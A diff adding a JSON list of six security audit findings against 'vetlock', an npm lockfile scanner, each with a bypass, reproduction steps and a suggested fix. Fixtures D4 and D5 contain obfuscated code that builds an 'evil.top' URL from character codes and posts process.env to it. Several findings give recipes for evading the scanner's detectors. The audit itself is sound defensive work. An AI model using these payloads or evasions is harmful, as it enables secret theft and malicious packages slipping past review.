@@ -1,0 +1,140 @@
+[
+  {
+    "id": "D1",
+    "title": "T5 tripwire (unconditional-BLOCK invariant) defeated by config: `severityOverride: {\"integrity.hash-mismatch\": \"INFO\"}` in .vetlock.json — same-version tarball swap now exits 0 (CLEAN)",
+    "class": "escalation-abuse / config-override",
+    "detectors_bypassed": [
+      "integrity.hash-mismatch",
+      "--fail-on (unless integrity.hash-mismatch explicitly listed)"
+    ],
+    "description": "The synthetic integrity-changed finding is emitted by the ENGINE at packages/core/src/engine.ts:148-168 with detector id `integrity.hash-mismatch` and severity BLOCK. This is treated by the README/DETECTIONS.md as the T5 'unconditional BLOCK' invariant — a same-version tarball swap must always trip it. But that finding then flows through `applyConfig` in the CLI (packages/cli/src/cli.ts:208), which in packages/core/src/config.ts:111-115 does `const override = config.severityOverride[f.detector]; if (override) return { ...f, severity: override };`. There is NO exclusion for the synthetic integrity finding — the config's `severityOverride` treats `integrity.hash-mismatch` exactly like any other detector id. An attacker who lands a PR that (a) republishes foo@1.2.3 to point at a new (malicious) tarball with a fresh integrity, AND (b) commits a `.vetlock.json` with `{\"severityOverride\": {\"integrity.hash-mismatch\": \"INFO\"}}`, causes vetlock to emit the finding at INFO instead of BLOCK. The CLI's `computeVerdict` (cli.ts:236-244) then returns INFO — exit code 0. Distinct from F3 (drop-the-integrity-field bypass) because it lets the attacker leave BOTH lockfile sides fully integrity-populated while still neutering the tripwire; the .vetlock.json is the single source of the softening. Also distinct from S2's coarser ignorePackages / allowlist — S2 needs an explicit package match, D1 targets the DETECTOR id and thus neutralizes integrity checking universe-wide across every package in the diff.",
+    "fixture_code": "// .vetlock.json committed alongside the malicious lockfile change:\n{\n  \"version\": 1,\n  \"severityOverride\": {\n    \"integrity.hash-mismatch\": \"INFO\"\n  }\n}\n\n// package-lock.json 'before' (already in main):\n// \"node_modules/foo\": { \"version\": \"1.2.3\", \"integrity\": \"sha512-AAA==\", \"resolved\": \"https://registry.npmjs.org/foo/-/foo-1.2.3.tgz\" }\n\n// package-lock.json 'after' (attacker's PR — SAME version, integrity flipped, tarball swap):\n// \"node_modules/foo\": { \"version\": \"1.2.3\", \"integrity\": \"sha512-EVIL==\", \"resolved\": \"https://registry.npmjs.org/foo/-/foo-1.2.3.tgz\" }\n\n// Reproduction (confirmed by direct simulation of the applyConfig chain):\n//   node -e \"const f={detector:'integrity.hash-mismatch',severity:'BLOCK'};\n//            const cfg={severityOverride:{'integrity.hash-mismatch':'INFO'}};\n//            if(cfg.severityOverride[f.detector]) f.severity=cfg.severityOverride[f.detector];\n//            console.log(f.severity);\"\n//   => INFO",
+    "reproduction_steps": [
+      "1. Attacker republishes foo@1.2.3 on npm with a new tarball (registry-side compromise or malicious mirror).",
+      "2. Attacker opens a PR that (a) regenerates package-lock.json so foo@1.2.3's integrity flips to the malicious hash, (b) adds `.vetlock.json` with `severityOverride: { \"integrity.hash-mismatch\": \"INFO\" }`.",
+      "3. CI runs `vetlock diff package-lock.json.before package-lock.json.after`.",
+      "4. Engine emits the synthetic integrity-changed finding at BLOCK.",
+      "5. CLI loads `.vetlock.json`, applyConfig's severityOverride step rewrites the finding to INFO.",
+      "6. computeVerdict returns INFO → exit code 0 → CI passes. No `--fail-on` protects unless the CI recipe includes `integrity.hash-mismatch` explicitly, which the README's failOn example does not.",
+      "7. Merge lands the tarball-swap, and the analyzer never fetched or analyzed the new tarball's contents (since it was the same version, no content-based detector would have run either)."
+    ],
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial (5-line .vetlock.json)",
+    "fix_effort": "small — exclude integrity.hash-mismatch (and other synthetic engine-emitted findings) from severityOverride & allowlist, OR treat it as an unconditional-BLOCK detector unaffected by user config",
+    "suggested_fix": "Introduce a `LOCKED_DETECTORS = new Set(['integrity.hash-mismatch'])` and skip severityOverride/allowlist/ignore* rewrites for those detector ids; log a WARN on stderr when the user's config attempted to modify them so the softening attempt is visible.",
+    "detectors_bypassed_note": "Also indirectly neutralizes every content-based detector that would have run on a properly-fetched malicious replacement — but since the engine only fetches the new tarball when the version changes OR when integrity change is treated as a signal, the tarball is never analyzed anyway."
+  },
+  {
+    "id": "D2",
+    "title": "`ignorePathsInside: { \"attacker-pkg\": [\"\"] }` — empty-string prefix silently drops every finding for the named package (any evidence path startsWith empty string)",
+    "class": "config-injection self-exemption",
+    "detectors_bypassed": [
+      "ALL — every finding for the named package is dropped before it reaches the verdict"
+    ],
+    "description": "packages/core/src/config.ts:91-98 filters findings via `!ignore.some((prefix) => first.file.startsWith(prefix))`. `first.file` is the evidence-file path (e.g. `package.json`, `lib/index.js`, `.wasm`). In JavaScript, `'anything'.startsWith('')` is unconditionally true. The zod schema (`ignorePathsInside: z.record(z.string(), z.array(z.string()))`) does NOT enforce a min length on the prefix strings, so an empty-string entry passes validation. The result: a `.vetlock.json` containing `ignorePathsInside: { \"attacker-pkg\": [\"\"] }` drops EVERY finding for `attacker-pkg` — including install.script-added, env.token-harvest, exec.new-module, fs.new-hotpath-write, bin.new-native-artifact, and even the synthetic integrity.hash-mismatch (whose evidence[0].file is `package.json`). Confirmed by direct simulation of the applyConfig chain — 2 BLOCK findings for a fake attacker-pkg were reduced to 0 findings. This is a stealthier variant of S2's ignorePackages: ignorePackages is a name-level exclusion that reviewers scanning `.vetlock.json` immediately recognize as suspicious ('why does the PR add an ignore for the package it's introducing?'); `ignorePathsInside` looks like a benign 'don't scan test/ folders' setting and hides the empty-string bomb in a legitimate-looking data structure. It also survives S2-style review lint rules that flag ignorePackages entries.",
+    "fixture_code": "// .vetlock.json committed with the malicious dep bump:\n{\n  \"version\": 1,\n  \"ignorePathsInside\": {\n    \"legit-pkg-1\": [\"test/\", \"examples/\"],\n    \"legit-pkg-2\": [\"docs/\"],\n    \"attacker-pkg\": [\"\"]\n  }\n}\n\n// Confirmed by:\n//   const findings=[{detector:'exec.new-module',package:'attacker-pkg',severity:'BLOCK',\n//                    evidence:[{file:'lib/index.js',line:1,snippet:'child_process'}]}];\n//   const cfg={ignorePathsInside:{'attacker-pkg':['']}};\n//   const kept=findings.filter(f=>{const ig=cfg.ignorePathsInside[f.package];\n//     if(!ig||!ig.length)return true;const e=f.evidence[0]; if(!e)return true;\n//     return !ig.some(p=>e.file.startsWith(p));});\n//   => kept.length === 0",
+    "reproduction_steps": [
+      "1. Attacker adds `attacker-pkg` (or bumps to a compromised version) in package-lock.json.",
+      "2. Same PR modifies `.vetlock.json` to append `\"attacker-pkg\": [\"\"]` inside `ignorePathsInside`, blending into an otherwise-legit `test/`/`examples/` map.",
+      "3. Every finding vetlock generates for attacker-pkg — env harvest, exec module, install script, native-binary, integrity-mismatch — has `evidence[0].file.startsWith('')` === true, so applyConfig drops all of them.",
+      "4. Verdict computed on remaining findings (zero for attacker-pkg) → CLEAN. Exit 0."
+    ],
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "fix_effort": "trivial — enforce `.min(1)` on each prefix string in the zod schema; separately, treat an empty prefix as a schema error since it's meaningless",
+    "suggested_fix": "Change the schema to `ignorePathsInside: z.record(z.string(), z.array(z.string().min(1)))`. In applyConfig, additionally require the prefix to contain at least one path separator OR match a known directory to prevent single-character prefixes like `l` from also dropping everything under `lib/`. Best: emit a WARN on stderr for any ignore-prefix shorter than 2 chars."
+  },
+  {
+    "id": "D3",
+    "title": "`trustedPublishers: { \"chalk\": [\"\"] }` — empty-string trust list downgrades meta.maintainer-change takeover-BLOCK to INFO because `evidence.includes(\"\")` is always true",
+    "class": "escalation-abuse / config-override",
+    "detectors_bypassed": [
+      "meta.maintainer-change (including the trust-store BLOCK 'takeover' path)"
+    ],
+    "description": "packages/core/src/config.ts:117-131 handles `meta.maintainer-change` via a downgrade rule: if `trustedPublishers[f.package]` is non-empty and `trusted.some((t) => evidence.includes(t))`, the finding is rewritten to INFO. `evidence` is the joined snippet string from the finding. `String.prototype.includes('')` returns true for every string. The zod schema (`trustedPublishers: z.record(z.string(), z.array(z.string()))`) allows empty strings — there is no min-length constraint. So an attacker who compromises a trusted publisher (e.g. takes over chalk from `sindresorhus`) can rewrite the PR's `.vetlock.json` to contain `trustedPublishers: { \"chalk\": [\"\"] }` and every maintainer-change finding on chalk — including the built-in-trust-store 'takeover pattern' BLOCK path from packages/detectors/src/meta.ts:54-58 — is downgraded to INFO. Confirmed via direct applyConfig simulation: a chalk maintainers→random@evil.com BLOCK finding becomes INFO after this config. This is distinct from S3's substring-trust-store bug (S3 uses `evidence.includes('@github.com')` where the trust anchor is 12 chars long); D3 uses the config path where the attacker directly injects the empty-string anchor. It is also distinct from D1's severityOverride because it targets the trust-downgrade code path specifically — meaning even if a reviewer notices `severityOverride` is being tampered with, `trustedPublishers` looks like a benign 'add our internal publisher domain' entry.",
+    "fixture_code": "// .vetlock.json in the takeover PR:\n{\n  \"version\": 1,\n  \"trustedPublishers\": {\n    \"chalk\": [\"\"]\n  }\n}\n\n// Confirmed:\n//   const f={detector:'meta.maintainer-change',package:'chalk',severity:'BLOCK',\n//            evidence:[{snippet:'maintainers:[sindresorhus] -> [random@evil.com]'}]};\n//   const cfg={trustedPublishers:{chalk:['']}};\n//   const trusted=cfg.trustedPublishers[f.package];\n//   const ev=f.evidence[0]?.snippet ?? '';\n//   if (trusted.some(t=>ev.includes(t))) f.severity='INFO';\n//   => 'INFO'",
+    "reproduction_steps": [
+      "1. Attacker compromises the chalk publisher account, publishes chalk@5.3.1 with the maintainers field replaced by random@evil.com.",
+      "2. Downstream victim's PR bumps chalk^5 → 5.3.1. Attacker also lands (through a chained/social-engineered PR OR by piggybacking on the maintainers-change PR itself) a `.vetlock.json` with `trustedPublishers: { \"chalk\": [\"\"] }`.",
+      "3. meta.maintainer-change detector fires with severity BLOCK ('takeover pattern: trusted publisher(s) replaced by unknown').",
+      "4. applyConfig sees `trustedPublishers['chalk'] = ['']`. `evidence.includes('')` is true. The BLOCK is downgraded to INFO. Verdict INFO. Exit 0."
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial once you've compromised the publisher (which is a prerequisite for the underlying takeover attack)",
+    "fix_effort": "trivial — schema-enforce `z.string().min(3)` on each entry AND require `t.includes('@')` OR reject entries shorter than a plausible username",
+    "suggested_fix": "Change schema to `trustedPublishers: z.record(z.string(), z.array(z.string().min(3)))` — an email or username has to have length ≥ 3. Separately, tighten the match in config.ts to require token boundaries (e.g. `\\b<trusted>\\b`) so a 3-char string can't accidentally match inside a longer email fragment."
+  },
+  {
+    "id": "D4",
+    "title": "Compound-suspicion escalation (rule 3) needs cats.size ≥ 2 — a package emitting 3+ OBF WARN findings in the SAME category (multiple obfuscated files) and no NET/INSTALL never escalates",
+    "class": "escalation-abuse (boundary)",
+    "detectors_bypassed": [
+      "Escalation rule 3 (compound WARN → BLOCK)",
+      "OBF → BLOCK promotion (rule 1 also needs co-occurring NET/INSTALL)"
+    ],
+    "description": "packages/detectors/src/index.ts:118-134 (Escalation 3) requires `warns.length >= 3 && cats.size >= 2` — both AND'd. Escalation 1 (index.ts:93-104) requires OBF WARN + a co-occurring NET or INSTALL finding in the same package. So a package that ships THREE obfuscated files — each producing one `obf.new-obfuscated-file` WARN — but no `require('http')/https/net/dns` imports, no URL literals in the code, no lifecycle scripts, no native binaries, no fs writes to hot paths, no env access — produces 3 WARN findings all in category OBF. Rule 3 sees `warns.length = 3`, `cats.size = 1` (only OBF) → `if (cats.size < 2) continue;` → no escalation. Rule 1 sees no NET/INSTALL → OBF stays WARN. Verdict WARN. This is a natural evasion for an attacker who uses runtime-constructed HTTP calls (e.g. `new (globalThis[('W'+'ebSocket')])('wss://...')`) and eval'd payloads whose URL is built at runtime from character arithmetic — no static URL literal, no `require('https')`, no lifecycle hooks — but ships the obfuscated payload spread across 3 minified files. Confirmed by direct simulation: 3 OBF WARN, 1 category → all stayed WARN, final verdict WARN.",
+    "fixture_code": "// Attacker's package `evil-utils@1.0.0`, contents:\n// lib/a.js — minified, contains one 300-char high-entropy base64-encoded RC4-encrypted payload\n// lib/b.js — minified, contains a suspicious literal (b64 decoded to garbage, not a URL → no encoded-endpoint hit)\n// lib/c.js — minified, contains one more suspicious literal, no imports, no URL, no fs, no env, no exec\n// package.json — no scripts, no bin, no maintainers change (added package, meta detector skips)\n// Runtime payload construction (executed on require):\n//   const c=String.fromCharCode; const w=globalThis[c(87)+c(101)+c(98)+c(83)+c(111)+c(99)+c(107)+c(101)+c(116)];\n//   const u=[104,116,116,112,115,58,47,47,101,118,105,108,46,116,111,112,47,99].map(c=>String.fromCharCode(c)).join('');\n//   fetch(u, {method:'POST', body: JSON.stringify(process.env)});\n// Emitted findings: 3 × obf.new-obfuscated-file WARN (one per minified file).\n// Rule 1: no NET/INSTALL → no OBF→BLOCK promotion.\n// Rule 3: warns=3 across 1 category (OBF) → cats.size < 2 → no promotion.\n// Verdict: WARN. Exit code: 1.\n\n// Confirmed simulation:\n//   const all=[{category:'OBF',severity:'WARN',package:'p'},{category:'OBF',severity:'WARN',package:'p'},{category:'OBF',severity:'WARN',package:'p'}];\n//   const risky=new Set(all.filter(f=>f.category==='NET'||f.category==='INSTALL').map(f=>f.package));\n//   for(const f of all) if(f.category==='OBF'&&f.severity==='WARN'&&risky.has(f.package)) f.severity='BLOCK';\n//   const warns=all.filter(f=>f.severity==='WARN');\n//   const cats=new Set(warns.map(w=>w.category));\n//   console.log(warns.length, cats.size); // 3 1  → no rule 3 escalation",
+    "reproduction_steps": [
+      "1. Attacker publishes `evil-utils@1.0.0` (fresh name, not a typosquat of any TOP_NPM_NAME) whose tarball ships 3 minified files each with 1 high-entropy 300+ char literal.",
+      "2. Payload uses `String.fromCharCode` character-code arithmetic to construct 'https' and 'evil.top' at runtime — no static URL literal, no bare TLD-matching literal, no `require('http')/https/net`.",
+      "3. `globalThis[key]` lookup for `WebSocket`/`fetch` — no `require('http')` at all (uses runtime global).",
+      "4. Consumer PR adds evil-utils to package.json.",
+      "5. vetlock emits 3 obf.new-obfuscated-file WARN. No NET, no INSTALL, no EXEC, no ENV (env access happens through eval'd runtime string), no FS. Rule 1 doesn't fire (no NET/INSTALL). Rule 3 doesn't fire (1 category).",
+      "6. Verdict WARN. If CI only gates on BLOCK, PR merges. Runtime payload exfiltrates env."
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "medium — payload obfuscation via char-code arithmetic is standard for hostile packages",
+    "fix_effort": "small — rule 3 should also trigger on `warns.length >= 3` regardless of category count when the single category is OBF (multiple obfuscated files IS the compound signal). Alternatively: a package that ships ≥3 obfuscated files on a first version should be its own BLOCK detector.",
+    "suggested_fix": "Add a per-category floor: if warns.length >= 3 AND (cats.size >= 2 OR the single category is OBF), escalate. Rationale: multiple obfuscated files on a first version is itself a compound suspicion — legitimate libraries don't need to ship three minified-without-source-map files."
+  },
+  {
+    "id": "D5",
+    "title": "Typosquat escalation (rule 2) requires BLOCK-tier NET/INSTALL/EXEC/ENV/FS — a typosquat that ships ONLY WARN-tier capabilities (net.new-module without net.new-endpoint) stays WARN",
+    "class": "escalation-abuse (boundary)",
+    "detectors_bypassed": [
+      "Escalation rule 2 (typosquat WARN → BLOCK)"
+    ],
+    "description": "packages/detectors/src/index.ts:106-116 (Escalation 2) requires `dangerousCategories.has(f.category) && f.severity === 'BLOCK'` for a package to be in the `dangerous` set that triggers typosquat → BLOCK escalation. `net.new-module` (WARN by net.ts:38), `wasm.unparseable` (WARN by wasm.ts:112), `obf.*` (WARN), `code.dynamic-loading-added` (WARN by code.ts:39) are all NON-BLOCK-tier findings in dangerous categories. An attacker who publishes a typosquat package (e.g. `axoiss` for `axios`) whose payload uses `require('https')` (produces net.new-module WARN, NOT the BLOCK-tier net.new-endpoint) and constructs the URL at runtime — no static URL literal — ships a typosquat WARN + a net WARN. Neither is BLOCK, so `dangerous` set is empty for that package. Escalation 2 sees `dangerous.has(f.package) === false` → no promotion. Rule 3: 2 findings, 2 categories (DEPS, NET) → warns.length = 2 < 3 → no promotion. Final verdict WARN. Confirmed via direct simulation of the escalation logic. The classic malicious typosquat shape assumed by the code comment — 'lookalike name next to a top-download that immediately spawns processes' — is deliberately narrow; a typosquat that simply IMPORTS the net capability without immediately calling a specific URL slips through. This complements S5 (2 WARN across 2 cats staying WARN) but is more specific to the typosquat detector's escalation contract.",
+    "fixture_code": "// Attacker publishes `axoiss@1.0.0` (typo of axios, edit-distance 1)\n// lib/index.js:\n//   const https = require('https');           // → net.new-module WARN (not net.new-endpoint BLOCK)\n//   const c = String.fromCharCode;\n//   const host = [101,118,105,108,46,116,111,112].map(x=>c(x)).join('');  // 'evil.top', built at runtime\n//   https.request({host, path:'/e', method:'POST'}, ()=>{}).end(JSON.stringify(globalThis.process?.env||{}));\n//   // No URL literal. No process.env.KEY member access (uses globalThis + optional-chain to avoid the env detector's MemberExpression visitor).\n// Emitted findings:\n//   - deps.typosquat-candidate (DEPS, WARN, distance 1 from 'axios')\n//   - net.new-module (NET, WARN, imports 'https')\n// Escalation 2: dangerous set = [] (no BLOCK-tier NET/INSTALL/EXEC/ENV/FS) → typosquat stays WARN.\n// Escalation 3: warns.length=2 < 3 → no promotion.\n// Final: WARN, WARN. Verdict WARN. If CI only fails on BLOCK, PR merges.\n\n// Confirmed simulation:\n//   const all=[{detector:'deps.typosquat-candidate',category:'DEPS',package:'axoiss',severity:'WARN'},\n//              {detector:'net.new-module',category:'NET',package:'axoiss',severity:'WARN'}];\n//   const dc=new Set(['NET','INSTALL','EXEC','ENV','FS']);\n//   const dang=new Set(all.filter(f=>dc.has(f.category)&&f.severity==='BLOCK').map(f=>f.package));\n//   // dang.size === 0 — typosquat NOT escalated.",
+    "reproduction_steps": [
+      "1. Attacker registers `axoiss@1.0.0` (edit-distance 1 from `axios`) on npm.",
+      "2. Payload uses `require('https')` (WARN net.new-module) and `String.fromCharCode` character-code arithmetic to build the exfil URL at runtime.",
+      "3. No static URL literal in source, so net.new-endpoint BLOCK does not fire.",
+      "4. No process.env.KEY dotted access (uses `globalThis.process?.env` — L1/L5 style envelope), so env.token-harvest doesn't fire — env access is via a lookup path the ENV detector doesn't visit.",
+      "5. Victim PR (perhaps typing `npm install axoiss` intending `axios`) commits the dep.",
+      "6. Escalation 2 doesn't fire (no BLOCK-tier finding); Escalation 3 doesn't fire (only 2 WARN).",
+      "7. Verdict WARN → exit code 1. If CI gates on BLOCK (exit 2), merge proceeds."
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "low",
+    "fix_effort": "small — extend rule 2 to also fire on WARN-tier NET/EXEC/ENV/FS/INSTALL findings",
+    "suggested_fix": "Change escalation 2's `dangerous` filter to `dangerousCategories.has(f.category)` (drop the `severity === 'BLOCK'` clause), OR add a second-tier escalation for typosquat + any WARN-tier dangerous capability at severity WARN → BLOCK when the edit distance is 1 (the high-confidence typosquat)."
+  },
+  {
+    "id": "D6",
+    "title": "TOP_NPM_NAMES is 230 names — critical popular targets (openai, nodemailer, stripe, discord.js, firebase, electron, sentry, slack-node, ioredis-mock, @nestjs/*, @sentry/*) are ABSENT; typosquats of them (openia, nodemaler, strippe, firebaze) return null from closestTop and produce zero DEPS findings",
+    "class": "detector-evasion (list-completeness)",
+    "detectors_bypassed": [
+      "deps.typosquat-candidate (both the WARN emission and the rule-2 escalation)"
+    ],
+    "description": "packages/detectors/src/top-npm-names.ts contains ~230 curated names, most focused on infrastructure/tooling. But many CRITICAL high-download packages are absent — I verified programmatically that the following are NOT in TOP_SET: `openai`, `nodemailer`, `stripe`, `discord.js`, `firebase`, `electron`, `@sentry/node`, `@sentry/react`, `slack-node`, `@slack/web-api`, `dotenv-vault`, `chromedriver`, `ollama`, `langchain`, `@anthropic-ai/sdk`, `mongodb-memory-server`. Any typosquat within edit-distance 2 of these — e.g. `openia`@1.0.0, `nodemaler`@1.0.0, `strippe`@1.0.0, `firebaze`@1.0.0 — passes through packages/detectors/src/typo.ts:41-50 with `best = null` because no entry in TOP_NPM_NAMES is close. Result: no `deps.typosquat-candidate` finding, no `deps.typosquat-candidate` WARN emitted, no rule-2 escalation ever considered. Confirmed via `closestTop('openia') === null`, `closestTop('nodemaler') === null`, `closestTop('strippe') === null`, `closestTop('firebaze') === null` using the actual damerau-levenshtein library and the actual TOP_NPM_NAMES source. `openai` in particular is one of the most-downloaded 2024 npm packages by weekly-installs and is a natural high-value typosquat target (developers install AI SDKs a lot; a squat of `openai` gets thousands of installs). vetlock also can't fall back to any escalation rule since it never emits the DEPS finding to begin with.",
+    "fixture_code": "// Attacker publishes 4 packages simultaneously — each a typosquat of a critical popular package that is NOT in TOP_NPM_NAMES:\n//   openia@1.0.0  (distance 1 from `openai`)\n//   nodemaler@1.0.0 (distance 1 from `nodemailer`)\n//   strippe@1.0.0 (distance 1 from `stripe`)\n//   firebaze@1.0.0 (distance 1 from `firebase`)\n// Each payload ships obviously malicious behavior (env harvest, exec, exfil URL literal to a listed TLD → each individually would still BLOCK via other detectors).\n// But: the TYPOSQUAT signal — which is what would give a reviewer immediate 'this is a lookalike, do not merge' certainty — never fires.\n// Any org that has an `.vetlock.json` set to `severityOverride: { 'net.new-endpoint': 'WARN' }` (a common softening) plus the config bypasses above sees ALL of these squats pass clean-ish.\n\n// Confirmed empirically against the real TOP_NPM_NAMES:\n//   node -e \"const dl=require('damerau-levenshtein');const fs=require('fs');\n//     const src=fs.readFileSync('./src/top-npm-names.ts','utf8');\n//     const T=new Set([...src.matchAll(/'([a-zA-Z0-9@\\/_.-]+)'/g)].map(m=>m[1]));\n//     const closest=(n,d=2)=>{if(T.has(n))return null;let b=null;\n//       for(const t of T){if(Math.abs(t.length-n.length)>d)continue;\n//       const{steps}=dl(n,t);if(steps>0&&steps<=d&&(!b||steps<b.distance))b={target:t,distance:steps};}return b;};\n//     console.log(closest('openia'), closest('nodemaler'), closest('strippe'), closest('firebaze'));\"\n//   → null null null null",
+    "reproduction_steps": [
+      "1. Attacker enumerates high-weekly-download npm packages NOT present in TOP_NPM_NAMES (openai, nodemailer, stripe, discord.js, firebase, electron, @sentry/node, langchain, @anthropic-ai/sdk, chromedriver, etc.).",
+      "2. Attacker registers `openia@1.0.0` (edit-distance 1 from `openai`) — no need to compromise anything, just publish.",
+      "3. Some victim developer typos `npm install openia` (or an internal tool fuzzy-matches on package suggestions).",
+      "4. vetlock runs against the resulting lockfile. Typosquat detector iterates the TOP_NPM_NAMES list and finds no match within edit-distance 2 for `openia` (because `openai` is absent). Emits nothing. No DEPS finding.",
+      "5. The package's OTHER capabilities may or may not fire other detectors (attacker can pair D6 with D4/D5 shapes to also avoid catching those). But the TYPOSQUAT signal — the strongest human-readable 'this is a squat' cue — is silently absent."
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial (publish a squat name)",
+    "fix_effort": "medium — add the missing popular packages, wire in a live-refresh mechanism (already on roadmap per top-npm-names.ts:11-12), publish a v0.2.1 with the expanded list",
+    "suggested_fix": "Expand TOP_NPM_NAMES to include at minimum: openai, @openai/*, nodemailer, stripe, @stripe/*, discord.js, firebase, @firebase/*, electron, @sentry/node, @sentry/react, @sentry/browser, langchain, @langchain/*, @anthropic-ai/sdk, ollama, chromedriver, slack-node, @slack/web-api, dotenv-vault, mongodb-memory-server, @nestjs/common, @nestjs/core, @nestjs/*. Also implement the roadmap live-refresh from npmjs.com/browse/depended so the list doesn't ossify. And ship a CI check that flags the list going >12 months without a refresh."
+  }
+]
